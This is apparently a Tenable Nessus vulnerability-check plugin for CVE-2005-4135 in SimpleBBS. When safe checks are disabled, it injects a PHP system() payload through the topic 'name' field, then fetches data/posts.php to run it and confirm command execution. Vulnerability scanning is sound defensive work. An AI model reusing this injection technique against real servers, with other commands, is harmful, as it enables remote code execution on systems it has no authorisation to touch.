#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20303);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2005-4135");
  script_bugtraq_id(15764);
  script_osvdb_id(21524);

  script_name(english:"SimpleBBS topics.php name Parameter Arbitrary Command Execution");
  script_summary(english:"Checks for name parameter arbitrary command execution vulnerability in SimpleBBS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to an
arbitrary command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running SimpleBBS, an open source
bulletin board system written in PHP. 

The version of SimpleBBS installed on the remote host fails to
sanitize user-supplied input to the 'name' parameter of the
'index.php' script when creating a new topic and adds that input to
several PHP files.  An attacker can leverage this flaw to inject
arbitrary PHP code into the application and then call one of those
files directly to cause that code to be executed on the remote host
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/418838" );
 script_set_attribute(attribute:"solution", value:
"Limit the ability to create new topics to trusted users." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/07");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:simplemedia:simplebbs");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/simplebbs", "/forum", "/sbbs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure it's SimpleBBS.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it is...
  if ("Powered by SimpleBBS" >< res) {
    # Grab the version number in case we need it later.
    pat = "Powered by SimpleBBS v(.+)";
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }
    }

    # If safe checks are not enabled...
    if (!safe_checks()) {
      # Try to exploit the flaw to run a command.
      cmd = "id";
      uniq_str = unixtime();
      # - First, inject it.
      postdata = string(
        'name=<!-- ', uniq_str, "<?php system(", cmd, "); ?> ", SCRIPT_NAME, " -->&",
        "subject=Test&", 
        "message=Just+a+test&",
        "sendTopic=Send"
      );
      w = http_send_recv3(method: "POST", port: port, 
      	item: dir+"/index.php?v=newtopic&c=1",
	content_type: "application/x-www-form-urlencoded",
	exit_on_fail: 1,
	data: postdata);

      # - Now, try to run it.
      #
      #   nb: if the flaw has already been exploited, we may not get
      #       to see our output.
      w = http_send_recv3(method:"GET", item:string(dir, "/data/posts.php"), port:port, exit_on_fail: 0);
      # nb: there might not be any posts yet.
      if (isnull(w))
        res = NULL;
      else
        res = w[2];

      # There's a problem if...
      if (
        # We see our identifier and...
        uniq_str >< res &&
        (
          # the output looks like it's from id or...
          egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
          # PHP's disable_functions prevents running system().
          egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
        )
      ) {
        if (report_verbosity > 0) {
          output = strstr(res, string("<!-- ", uniq_str));
          if (output) output = output - strstr(output, string(SCRIPT_NAME, " -->"));
          if (output) output = output - string("<!-- ", uniq_str);
          if (isnull(output)) output = res;

          report = string(
            "\n",
            "Nessus was able to execute the command 'id' on the remote host;\n",
            "the output was:\n",
            "\n",
            output
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);

        exit(0);
      }
    }

    # Do a banner check in case safe checks were enabled or 
    # an exploit has already been run.
    if (ver =~ "^1\.(0|1([^0-9]|$))") {
      report = string(
        "\n",
        "Nessus determined the flaw exists on the remote host based solely\n",
        "on the version number of SimpleBBS found in the banner."
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
